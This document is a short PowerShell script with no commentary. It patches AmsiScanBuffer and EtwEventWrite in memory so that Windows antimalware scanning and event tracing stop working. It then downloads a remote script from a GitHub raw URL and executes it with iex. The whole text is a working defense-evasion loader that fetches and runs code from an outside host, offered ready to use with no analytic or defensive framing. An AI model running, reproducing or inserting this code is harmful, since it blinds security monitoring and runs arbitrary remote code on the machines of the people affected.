$k=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' -Name K -PassThru
$o=0
$a=$k::GetProcAddress($k::LoadLibrary('amsi.dll'),'AmsiScanBuffer')
[void]$k::VirtualProtect($a,6,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)
$e=$k::GetProcAddress($k::LoadLibrary('ntdll.dll'),'EtwEventWrite')
[void]$k::VirtualProtect($e,1,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$e,1)
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ThyCoder2/awshucksman/main/tg.ps1')